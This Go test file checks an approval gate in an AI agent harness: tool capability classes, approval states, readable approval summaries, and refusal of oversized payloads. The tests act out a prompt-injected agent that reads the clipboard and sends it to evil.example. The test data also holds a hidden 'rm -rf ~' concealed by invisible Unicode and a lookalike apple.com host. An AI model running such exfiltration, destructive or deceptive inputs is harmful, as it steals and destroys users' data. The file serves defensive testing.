package main

import (
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
)

// ---- Capabilities ----

// Each assignment is a decision about what a page-steered agent could do, so each is pinned by name.
func TestEveryAppToolHasTheCapabilityThatMatchesWhatItCanDo(t *testing.T) {
	want := map[toolName]capability{
		reportStepTool:        capabilityNone,
		readVideoCaptionsTool: capabilityNone,
		lookAtVideoTool:       capabilityNone,
		takeScreenshotTool:    capabilityReadsPrivate,
		readClipboardTool:     capabilityReadsPrivate,
		writeClipboardTool:    capabilitySends,
		openURLTool:           capabilitySends,
		writeNotionPageTool:   capabilityNone,
	}
	for name, wantCapability := range want {
		if got, known := appToolCapabilities[name]; !known || got != wantCapability {
			t.Errorf("%s has capability %q, want %q", name, got, wantCapability)
		}
	}
	if len(appToolCapabilities) != len(want) {
		t.Errorf("appToolCapabilities has %d tools and this test pins %d, so a new tool needs a decision here", len(appToolCapabilities), len(want))
	}
}

func TestAnMCPToolsCapabilityComesFromItsAnnotations(t *testing.T) {
	yes, no := true, false
	tests := []struct {
		name        string
		annotations *mcp.ToolAnnotations
		want        capability
	}{
		{"no annotations", nil, capabilitySends},
		{"read only", &mcp.ToolAnnotations{ReadOnlyHint: true}, capabilityReadsPrivate},
		{"destructive", &mcp.ToolAnnotations{DestructiveHint: &yes}, capabilityDeletes},
		{"explicitly not destructive", &mcp.ToolAnnotations{DestructiveHint: &no}, capabilitySends},
		{"annotations that say nothing about it", &mcp.ToolAnnotations{Title: "A tool"}, capabilitySends},
		{"read only wins over destructive", &mcp.ToolAnnotations{ReadOnlyHint: true, DestructiveHint: &yes}, capabilityReadsPrivate},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := (mcpTool{annotations: test.annotations}).capability(); got != test.want {
				t.Errorf("capability was %q, want %q", got, test.want)
			}
		})
	}
}

// ---- The states one gated call moves through ----

func TestAGatedCallMovesThroughItsApprovalStates(t *testing.T) {
	// Where a call starts.
	startTests := []struct {
		name       string
		needed     capability
		hasGrant   bool
		wantPhase  approvalPhase
		wantMayRun bool
	}{
		{"no capability runs", capabilityNone, false, approvalNotRequired, true},
		{"a capability with no grant waits", capabilitySends, false, approvalAwaitingAnswer, false},
		{"a capability with an always grant runs", capabilityDeletes, true, approvalAlreadyGranted, true},
		{"reads_private waits like the others", capabilityReadsPrivate, false, approvalAwaitingAnswer, false},
	}
	for _, test := range startTests {
		t.Run(test.name, func(t *testing.T) {
			phase := startingPhase(test.needed, test.hasGrant)
			if phase != test.wantPhase || phase.mayRun() != test.wantMayRun {
				t.Errorf("started in phase %d (may run %v), want %d (may run %v)", phase, phase.mayRun(), test.wantPhase, test.wantMayRun)
			}
		})
	}

	// Where it goes. Only a waiting call changes, so a late or repeated answer cannot undo an end.
	if got := approvalAwaitingAnswer.afterAnswer(true); got != approvalGiven || !got.mayRun() {
		t.Errorf("a waiting call that is approved should run, got phase %d", got)
	}
	if got := approvalAwaitingAnswer.afterAnswer(false); got != approvalDeclined || got.mayRun() {
		t.Errorf("a waiting call that is declined must not run, got phase %d", got)
	}
	if got := approvalAwaitingAnswer.afterTaskEnds(); got != approvalAbandoned || got.mayRun() {
		t.Errorf("a waiting call whose task ended must not run, got phase %d", got)
	}
	for _, ended := range []approvalPhase{approvalNotRequired, approvalAlreadyGranted, approvalGiven, approvalDeclined, approvalAbandoned} {
		if ended.afterAnswer(true) != ended || ended.afterAnswer(false) != ended || ended.afterTaskEnds() != ended {
			t.Errorf("phase %d changed after it had ended", ended)
		}
	}
}

// ---- The gate ----

type capturedRequests struct {
	requests chan approvalRequestMessage
}

func newCapturedRequests() *capturedRequests {
	return &capturedRequests{requests: make(chan approvalRequestMessage, 8)}
}

func (captured *capturedRequests) send(message outboundMessage) {
	if request, isRequest := message.(approvalRequestMessage); isRequest {
		captured.requests <- request
	}
}

func (captured *capturedRequests) next(t *testing.T) approvalRequestMessage {
	t.Helper()
	select {
	case request := <-captured.requests:
		return request
	case <-time.After(testTimeout):
		t.Fatal("the gate sent no approval request")
		return approvalRequestMessage{}
	}
}

// authorizeAndAnswer runs one authorization in the background, answers the request it sends, and returns the phase.
func authorizeAndAnswer(t *testing.T, gate *approvalGate, tool toolName, needed capability, answer approvalResultMessage) approvalPhase {
	t.Helper()
	captured := newCapturedRequests()
	phases := make(chan approvalPhase, 1)
	go func() {
		phases <- gate.authorize(context.Background(), "task-1", tool, needed, "summary", captured.send)
	}()
	answer.ApprovalID = captured.next(t).ApprovalID
	if !gate.deliver(answer) {
		t.Fatal("the answer matched no waiting call")
	}
	return <-phases
}

func TestAnAlwaysAnswerCoversThatToolAtThatCapabilityForTheRestOfTheProcess(t *testing.T) {
	gate := newApprovalGate()
	if got := authorizeAndAnswer(t, gate, "tool_a", capabilitySends, approvalResultMessage{Approved: true, Scope: approvalScopeAlways}); got != approvalGiven {
		t.Fatalf("the first call ended in phase %d", got)
	}
	// The same tool and capability runs without a question, in any task.
	silent := newCapturedRequests()
	if got := gate.authorize(context.Background(), "task-2", "tool_a", capabilitySends, "summary", silent.send); got != approvalAlreadyGranted {
		t.Errorf("the same tool should be already granted, got phase %d", got)
	}
	if len(silent.requests) != 0 {
		t.Error("an already granted call must not send a request")
	}
	// Another tool, or the same tool at another capability, still asks.
	if got := authorizeAndAnswer(t, gate, "tool_b", capabilitySends, approvalResultMessage{Approved: false, Scope: approvalScopeOnce}); got != approvalDeclined {
		t.Errorf("another tool should ask, got phase %d", got)
	}
	if got := authorizeAndAnswer(t, gate, "tool_a", capabilityDeletes, approvalResultMessage{Approved: false, Scope: approvalScopeOnce}); got != approvalDeclined {
		t.Errorf("the same tool at another capability should ask, got phase %d", got)
	}
}

func TestAOnceAnswerAndAnAlwaysNoAreNeverRemembered(t *testing.T) {
	gate := newApprovalGate()
	authorizeAndAnswer(t, gate, "tool_a", capabilitySends, approvalResultMessage{Approved: true, Scope: approvalScopeOnce})
	if got := authorizeAndAnswer(t, gate, "tool_a", capabilitySends, approvalResultMessage{Approved: false, Scope: approvalScopeAlways}); got != approvalDeclined {
		t.Errorf("a once answer should not be remembered, got phase %d", got)
	}
	if got := authorizeAndAnswer(t, gate, "tool_a", capabilitySends, approvalResultMessage{Approved: true, Scope: approvalScopeOnce}); got != approvalGiven {
		t.Errorf("an always no should not be remembered either, got phase %d", got)
	}
}

func TestACallWaitsUntilItsTaskEndsAndAnswersAfterwardsAreDropped(t *testing.T) {
	gate := newApprovalGate()
	taskContext, endTask := context.WithCancel(context.Background())
	captured := newCapturedRequests()
	phases := make(chan approvalPhase, 1)
	go func() {
		phases <- gate.authorize(taskContext, "task-1", "tool_a", capabilitySends, "summary", captured.send)
	}()
	request := captured.next(t)

	select {
	case phase := <-phases:
		t.Fatalf("the call ended in phase %d before any answer", phase)
	case <-time.After(50 * time.Millisecond):
	}
	endTask()
	if got := <-phases; got != approvalAbandoned {
		t.Errorf("a call whose task ended should be abandoned, got phase %d", got)
	}
	if gate.deliver(approvalResultMessage{ApprovalID: request.ApprovalID, Approved: true}) {
		t.Error("an answer after the task ended should match nothing")
	}
	if gate.deliver(approvalResultMessage{ApprovalID: "approval-999", Approved: true}) {
		t.Error("an answer for an ID the gate never made should match nothing")
	}
}

// ---- What the learner reads ----

func approvalCall(name toolName, input string) toolCall {
	return toolCall{ID: "t", Name: name, Input: json.RawMessage(input)}
}

func TestAnApprovalSummaryIsWrittenFromTheCallsOwnInputInPlainWords(t *testing.T) {
	// A clipboard text just under the limit is shown whole.
	wholeText := strings.Repeat("a", longestClipboardWrite-1) + "Z"
	tests := []struct {
		name     string
		call     toolCall
		contains []string
	}{
		{"a link names its host and the whole link", approvalCall(openURLTool, `{"url":"https://evil.example/collect?data=secret-clipboard-text"}`),
			[]string{"Open this link in your browser.", "Host: evil.example\n", "Link: https://evil.example/collect?data=secret-clipboard-text"}},
		{"a link with a port shows the port with the host", approvalCall(openURLTool, `{"url":"http://127.0.0.1:8080/x"}`), []string{"Host: 127.0.0.1:8080\n"}},
		{"clipboard text is shown whole with its length", approvalCall(writeClipboardTool, `{"text":"`+wholeText+`"}`),
			[]string{"Replace your clipboard", "(500 characters)", wholeText}},
		{"a clipboard read says what is read", approvalCall(readClipboardTool, `{}`), []string{"Read the text on your clipboard"}},
		{"a screenshot says the screen and the display", approvalCall(takeScreenshotTool, `{}`), []string{"whole screen", "display your mouse is on"}},
		{"unreadable input still gets a summary", approvalCall(openURLTool, `not json`), []string{"Open this link", "no host that can be read"}},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			summary := approvalSummary(test.call, nil)
			for _, want := range test.contains {
				if !strings.Contains(summary, want) {
					t.Errorf("the summary %q lacks %q", summary, want)
				}
			}
		})
	}
}

func TestAnApprovalSummaryShowsSeparatorsAndInvisibleCharactersInsteadOfHidingThem(t *testing.T) {
	// A right-to-left override can reorder what follows it, and a zero-width space splits a word the eye reads whole.
	clipboard := approvalSummary(approvalCall(writeClipboardTool, `{"text":"echo hi‮; rm -rf ~​/\nsecond\tline end"}`), nil)
	for _, want := range []string{`\u{202E}`, `\u{200B}`, `\u{00A0}`, "⏎second", `\tline`} {
		if !strings.Contains(clipboard, want) {
			t.Errorf("the summary %q lacks %q", clipboard, want)
		}
	}
	for _, hidden := range []string{"‮", "​", " ", "\t"} {
		if strings.Contains(clipboard, hidden) {
			t.Errorf("the summary %q holds the invisible character %q", clipboard, hidden)
		}
	}
	// The newline is the model's, so the summary's own lines are the only ones left.
	if got := strings.Count(clipboard, "\n"); got != 1 {
		t.Errorf("the clipboard summary has %d line breaks, want 1 (after its heading)", got)
	}
	if got := cleanForSummary("bell\a"); got != `bell\u{0007}` {
		t.Errorf("an unprintable control character showed as %q", got)
	}
}

func TestALookalikeHostShowsItsRealPunycodeName(t *testing.T) {
	// The first letter is Cyrillic a (U+0430), which looks like the Latin one.
	summary := approvalSummary(approvalCall(openURLTool, `{"url":"https://аpple.com/login"}`), nil)
	if !strings.Contains(summary, "Host: xn--pple-43d.com\n") {
		t.Errorf("the summary %q does not show the xn-- host", summary)
	}
}

func TestAnMCPCallShowsEveryArgumentWithRequiredFieldsFirst(t *testing.T) {
	server := &mcpTool{
		serverName: "t3-code", toolName: "send",
		inputSchema: map[string]any{"required": []any{"threadId", "text"}},
	}
	summary := approvalSummary(approvalCall("mcp__t3-code__send", `{"zeta":{"a":1},"text":"hello\nteam","alpha":true,"threadId":"abc"}`), server)
	want := "threadId: abc\ntext: hello⏎team\nalpha: true\nzeta: {\"a\":1}"
	if !strings.HasSuffix(summary, want) || !strings.Contains(summary, `Use the "send" tool of the "t3-code" server`) {
		t.Errorf("the summary was %q, want it to end with %q", summary, want)
	}
	if got := approvalSummary(approvalCall("mcp__t3-code__send", `{}`), server); !strings.HasSuffix(got, "(no arguments)") {
		t.Errorf("a call with no arguments said %q", got)
	}
}

// A payload the learner cannot read in full is refused with a reason, and no approval is asked for.
func TestACallWhosePayloadIsTooLongToShowIsRefusedBeforeAnyApprovalIsAsked(t *testing.T) {
	server := &mcpTool{serverName: "s", toolName: "send"}
	tests := []struct {
		name    string
		call    toolCall
		server  *mcpTool
		refused bool
	}{
		{"clipboard text at the limit", approvalCall(writeClipboardTool, `{"text":"`+strings.Repeat("a", longestClipboardWrite)+`"}`), nil, false},
		{"clipboard text over the limit", approvalCall(writeClipboardTool, `{"text":"`+strings.Repeat("a", longestClipboardWrite+1)+`"}`), nil, true},
		{"an MCP input at the limit", approvalCall("mcp__s__send", `{"text":"`+strings.Repeat("a", longestMCPInput-len(`{"text":""}`))+`"}`), server, false},
		{"an MCP input over the limit", approvalCall("mcp__s__send", `{"text":"`+strings.Repeat("a", longestMCPInput)+`"}`), server, true},
		{"an MCP input that is not an object", approvalCall("mcp__s__send", `[1]`), server, true},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if refusal := approvalRefusal(test.call, test.server); (refusal != "") != test.refused {
				t.Errorf("refusal was %q, want refused %v", refusal, test.refused)
			}
		})
	}
}

func TestAClipboardWriteOfSixHundredCharactersIsRefusedWithNoApprovalRequest(t *testing.T) {
	worker := newFakeWorker(t, func(writer http.ResponseWriter, _ *http.Request, _ recordedRequest, requestNumber int) {
		if requestNumber == 1 {
			writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_copy", "write_clipboard", `{"text":"`+strings.Repeat("x", 600)+`"}`))
			return
		}
		writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_finish", "finish", `{"spokenSummary":"Done."}`))
	})
	driver := startHarness(t, worker.server.URL)
	driver.send(startTaskLine("task-1", "copy this"))

	// Neither an approval request nor a tool call comes, so the next line is the task's end.
	driver.expectLine("task_finished")
	result := jsonValueAt(t, worker.requests()[1].body, "messages", 2, "content", 0)
	text := jsonValueAt(t, result, "content", 0, "text").(string)
	if jsonValueAt(t, result, "is_error") != true || !strings.Contains(text, "600 characters") || !strings.Contains(text, "500") {
		t.Errorf("the model should read why the copy was refused, got %v", result)
	}
}

// A key written twice could pass the check and the summary with one value and run with the other, since Go keeps the
// last value and another reader may keep the first. The app gets the input the summary showed, with the key once.
func TestTheAppRunsTheSameInputTheLearnerApproved(t *testing.T) {
	worker := newFakeWorker(t, func(writer http.ResponseWriter, _ *http.Request, _ recordedRequest, requestNumber int) {
		if requestNumber == 1 {
			writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_copy", "write_clipboard", `{"text":"`+strings.Repeat("x", 600)+`","text":"hi"}`))
			return
		}
		writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_finish", "finish", `{"spokenSummary":"Done."}`))
	})
	driver := startHarness(t, worker.server.URL)
	driver.send(startTaskLine("task-1", "copy this"))

	request := driver.answerNextApproval(true, "once")
	if !strings.Contains(request, "(2 characters):\\nhi") {
		t.Errorf("the approval request was %s", request)
	}
	if got, want := driver.expectLine("tool_call"), `{"type":"tool_call","taskID":"task-1","toolUseID":"toolu_copy","name":"write_clipboard","input":{"text":"hi"}}`; got != want {
		t.Errorf("tool call line:\n got %s\nwant %s", got, want)
	}

	// A number shows as the digits that were sent, not as the float a plain decode rounds it to.
	server := &mcpTool{serverName: "s", toolName: "send"}
	if summary := approvalSummary(approvalCall("mcp__s__send", `{"amount":12345678901234567890}`), server); !strings.Contains(summary, "amount: 12345678901234567890") {
		t.Errorf("the summary was %q", summary)
	}
}

func TestAnMCPCallWithAnInputOverTheLimitIsRefusedAndNeverRuns(t *testing.T) {
	configPath, ranToolsPath := fixtureMCPConfig(t)
	worker := newFakeWorker(t, func(writer http.ResponseWriter, _ *http.Request, _ recordedRequest, requestNumber int) {
		if requestNumber == 1 {
			writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_send", "mcp__fixture__send_note", `{"text":"`+strings.Repeat("x", 1600)+`"}`))
			return
		}
		writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_finish", "finish", `{"spokenSummary":"Done."}`))
	})
	driver := startHarnessWith(t, configuration{workerBaseURL: worker.server.URL, mcpConfigPath: configPath, lookupEnvironment: noEnvironment})
	driver.send(startTaskLine("task-1", "send a long note"))

	driver.expectLine("task_finished")
	if got := toolsTheFixtureRan(t, ranToolsPath); len(got) != 0 {
		t.Errorf("the server ran %v for a refused call", got)
	}
	result := jsonValueAt(t, worker.requests()[1].body, "messages", 2, "content", 0)
	if jsonValueAt(t, result, "is_error") != true || !strings.Contains(jsonValueAt(t, result, "content", 0, "text").(string), "1500") {
		t.Errorf("the model should read why the call was refused, got %v", result)
	}
}

// ---- The protocol ----

func TestApprovalIDsAreRandomSoANewProcessNeverRepeatsOne(t *testing.T) {
	first, second := newApprovalID(), newApprovalID()
	if first == second || len(first) != len("approval-")+32 {
		t.Errorf("the approval IDs were %q and %q", first, second)
	}
}

func TestParsingAnApprovalResult(t *testing.T) {
	got, err := parseInboundMessage([]byte(`{"type":"approval_result","approvalID":"approval-1","approved":true,"scope":"always"}`))
	if err != nil || got != (approvalResultMessage{ApprovalID: "approval-1", Approved: true, Scope: "always"}) {
		t.Errorf("parsed %#v, %v", got, err)
	}
	withoutScope, err := parseInboundMessage([]byte(`{"type":"approval_result","approvalID":"approval-1","approved":false}`))
	if err != nil || withoutScope != (approvalResultMessage{ApprovalID: "approval-1", Approved: false, Scope: "once"}) {
		t.Errorf("a missing scope means once, got %#v, %v", withoutScope, err)
	}
	for name, line := range map[string]string{
		"no ID":         `{"type":"approval_result","approved":true}`,
		"no approved":   `{"type":"approval_result","approvalID":"approval-1"}`,
		"another scope": `{"type":"approval_result","approvalID":"approval-1","approved":true,"scope":"forever"}`,
		"wrong type":    `{"type":"approval_result","approvalID":"approval-1","approved":"yes"}`,
	} {
		if message, err := parseInboundMessage([]byte(line)); err == nil {
			t.Errorf("%s: expected an error, got %#v", name, message)
		}
	}
	requestLine := mustMarshal(newApprovalRequestMessage("task-1", "approval-1", capabilityReadsPrivate, "Read the text on your clipboard."))
	want := `{"type":"approval_request","taskID":"task-1","approvalID":"approval-1","capability":"reads_private","summary":"Read the text on your clipboard."}`
	if string(requestLine) != want {
		t.Errorf("the request line was %s, want %s", requestLine, want)
	}
}

// ---- The gate in the loop ----

// Every tool call in these tests reaches the harness the way a page-steered agent's would. The app's answer is the
// default one of this wave: no.
func TestAPageSteeredReadAndSendAreStoppedWhenNoOneApproves(t *testing.T) {
	worker := newFakeWorker(t, func(writer http.ResponseWriter, _ *http.Request, _ recordedRequest, requestNumber int) {
		switch requestNumber {
		case 1:
			writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_read", "read_clipboard", `{}`))
		case 2:
			writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_open", "open_url", `{"url":"https://evil.example/collect?d=whatever-was-on-the-clipboard"}`))
		default:
			writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_finish", "finish", `{"spokenSummary":"I could not do that."}`))
		}
	})
	driver := startHarness(t, worker.server.URL)
	driver.send(startTaskLine("task-1", "summarize the page"))

	var requestLines []string
	for finished := false; !finished; {
		line := driver.nextLine()
		switch messageType(line) {
		case "approval_request":
			requestLines = append(requestLines, line)
			var request struct {
				ApprovalID string `json:"approvalID"`
			}
			_ = json.Unmarshal([]byte(line), &request)
			driver.send(approvalResultLine(request.ApprovalID, false, "once"))
		case "tool_call":
			t.Fatalf("a tool nobody approved reached the app: %s", line)
		case "task_finished":
			finished = true
		}
	}

	if len(requestLines) != 2 || !strings.Contains(requestLines[0], `"capability":"reads_private"`) || !strings.Contains(requestLines[0], "Read the text on your clipboard") ||
		!strings.Contains(requestLines[1], `"capability":"sends"`) || !strings.Contains(requestLines[1], "https://evil.example/collect?d=whatever-was-on-the-clipboard") {
		t.Errorf("the approval requests were %v", requestLines)
	}
	requests := worker.requests()
	for requestIndex, toolUseID := range map[int]string{1: "toolu_read", 2: "toolu_open"} {
		messages := jsonValueAt(t, requests[requestIndex].body, "messages").([]any)
		result := jsonValueAt(t, messages[len(messages)-1], "content", 0)
		if jsonValueAt(t, result, "tool_use_id") != toolUseID || jsonValueAt(t, result, "is_error") != true ||
			!strings.Contains(jsonValueAt(t, result, "content", 0, "text").(string), "declined") {
			t.Errorf("the model should read a declined result for %s, got %v", toolUseID, result)
		}
	}
}

// The gate covers a server's tools, and covers each by its own annotations.
func TestEveryMCPToolRunsOnlyAfterApprovalAtTheCapabilityItsAnnotationsGive(t *testing.T) {
	configPath, ranToolsPath := fixtureMCPConfig(t)
	worker := newFakeWorker(t, func(writer http.ResponseWriter, _ *http.Request, _ recordedRequest, requestNumber int) {
		if requestNumber == 1 {
			writeStreamedMessage(writer, "tool_use",
				toolUseBlock("toolu_read", "mcp__fixture__read_note", `{"text":"x"}`),
				toolUseBlock("toolu_send", "mcp__fixture__send_note", `{"text":"hello team"}`),
				toolUseBlock("toolu_delete", "mcp__fixture__delete_note", `{"text":"x"}`),
			)
			return
		}
		writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_finish", "finish", `{"spokenSummary":"Done."}`))
	})
	driver := startHarnessWith(t, configuration{workerBaseURL: worker.server.URL, mcpConfigPath: configPath, lookupEnvironment: noEnvironment})
	driver.send(startTaskLine("task-1", "tidy the notes"))

	// read_note says it is read only, so it reads private data. The learner approves it.
	readRequest := driver.answerNextApproval(true, "once")
	if !strings.Contains(readRequest, `"capability":"reads_private"`) || !strings.Contains(readRequest, "read_note") {
		t.Errorf("the read request was %s", readRequest)
	}
	// send_note has no annotations, so it sends. The learner declines it.
	sendRequest := driver.answerNextApproval(false, "once")
	if !strings.Contains(sendRequest, `"capability":"sends"`) || !strings.Contains(sendRequest, "send_note") || !strings.Contains(sendRequest, "hello team") {
		t.Errorf("the send request was %s", sendRequest)
	}
	// delete_note says it is destructive. The learner approves it.
	deleteRequest := driver.answerNextApproval(true, "once")
	if !strings.Contains(deleteRequest, `"capability":"deletes"`) || !strings.Contains(deleteRequest, "delete_note") {
		t.Errorf("the delete request was %s", deleteRequest)
	}
	driver.expectLine("task_finished")

	// The server's own record: the two approved tools ran, and the declined one never did.
	ran := strings.Join(toolsTheFixtureRan(t, ranToolsPath), ",")
	if ran != "read_note,delete_note" && ran != "delete_note,read_note" {
		t.Errorf("the server ran %q, want read_note and delete_note only", ran)
	}
	results := jsonValueAt(t, worker.requests()[1].body, "messages", 2, "content").([]any)
	if jsonValueAt(t, results[1], "is_error") != true || !strings.Contains(jsonValueAt(t, results[1], "content", 0, "text").(string), "declined") {
		t.Errorf("the declined send_note result was %v", results[1])
	}
	if jsonValueAt(t, results[0], "is_error") != false || jsonValueAt(t, results[2], "is_error") != false {
		t.Errorf("the read and approved delete results were %v and %v", results[0], results[2])
	}
}

func TestAnAlwaysAnswerLetsTheSameMCPToolRunAgainWithoutAsking(t *testing.T) {
	configPath, ranToolsPath := fixtureMCPConfig(t)
	worker := newFakeWorker(t, func(writer http.ResponseWriter, _ *http.Request, _ recordedRequest, requestNumber int) {
		if requestNumber <= 2 {
			writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_send_"+string(rune('0'+requestNumber)), "mcp__fixture__send_note", `{"text":"hi"}`))
			return
		}
		writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_finish", "finish", `{"spokenSummary":"Done."}`))
	})
	driver := startHarnessWith(t, configuration{workerBaseURL: worker.server.URL, mcpConfigPath: configPath, lookupEnvironment: noEnvironment})
	driver.send(startTaskLine("task-1", "send twice"))

	driver.answerNextApproval(true, "always")
	// The second send asks nothing, so the next line the harness writes is the end of the task.
	driver.expectLine("task_finished")
	if !driver.logsContain("already approved") {
		t.Errorf("the log did not say the second call was already approved: %v", driver.logs)
	}
	if got := strings.Join(toolsTheFixtureRan(t, ranToolsPath), ","); got != "send_note,send_note" {
		t.Errorf("the server ran %q, want send_note twice", got)
	}
}

// ---- Only the tools offered for the task ----

func TestAToolOutsideTheTasksOfferedSetIsNeverDispatched(t *testing.T) {
	configPath, ranToolsPath := fixtureMCPConfig(t)
	skillsDirectory := t.TempDir()
	writeSkillFile(t, skillsDirectory, "captions-only", "---\nname: captions-only\ndescription: Read captions.\ntools: read_video_captions\n---\nRead the captions.")
	worker := newFakeWorker(t, func(writer http.ResponseWriter, _ *http.Request, _ recordedRequest, requestNumber int) {
		if requestNumber == 1 {
			writeStreamedMessage(writer, "tool_use",
				toolUseBlock("toolu_shot", "take_screenshot", `{}`),
				// A server tool the skill did not offer, so the harness refuses it before any approval.
				toolUseBlock("toolu_note", "mcp__fixture__read_note", `{"text":"x"}`),
				// A page the skill did not offer, whose sources are neither checked nor logged.
				toolUseBlock("toolu_page", "write_notion_page", `{"title":"t","summary":"s","sections":[],"sources":[{"title":"x","url":"https://b.example/?q=secret"}]}`),
			)
			return
		}
		writeStreamedMessage(writer, "tool_use", toolUseBlock("toolu_finish", "finish", `{"spokenSummary":"Done."}`))
	})
	driver := startHarnessWith(t, configuration{
		workerBaseURL: worker.server.URL, mcpConfigPath: configPath, lookupEnvironment: noEnvironment, skillsDirectories: []string{skillsDirectory},
	})
	driver.send(startTaskWithSkillLine("task-1", "read the captions", "captions-only"))

	// No approval request, no tool call to the app: the next line is the task's end.
	driver.expectLine("task_finished")
	if got := toolsTheFixtureRan(t, ranToolsPath); len(got) != 0 {
		t.Errorf("the server ran %v for a tool the task was not offered", got)
	}
	results := jsonValueAt(t, worker.requests()[1].body, "messages", 2, "content").([]any)
	if driver.logsContain("Task agent: refused a page") {
		t.Errorf("a page the task was not offered logged a source refusal: %v", driver.logs)
	}
	for resultIndex, wantName := range []string{"take_screenshot", "mcp__fixture__read_note", "write_notion_page"} {
		if jsonValueAt(t, results[resultIndex], "is_error") != true || jsonValueAt(t, results[resultIndex], "content", 0, "text") != wantName+" is not a tool" {
			t.Errorf("the result for %s was %v", wantName, results[resultIndex])
		}
	}
}
